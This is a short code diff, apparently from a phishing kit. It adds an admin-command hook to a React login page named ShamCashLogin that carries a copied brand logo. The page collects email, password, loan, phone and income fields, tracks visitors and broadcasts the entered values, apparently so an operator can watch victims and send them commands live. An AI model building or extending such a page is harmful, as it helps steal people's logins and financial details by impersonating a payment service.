@@ -10,6 +10,7 @@ import {
 } from "lucide-react";
 import { useState, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useAdminCommands } from "@/hooks/useAdminCommands";
 
 function ShamLogo() {
   return (
@@ -39,6 +40,7 @@ export function ShamCashLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
   useVisitorTracking("تسجيل الدخول");
+  useAdminCommands();
 
   useEffect(() => {
     broadcast({ email: "", phone: "", loan: "", income: "" });
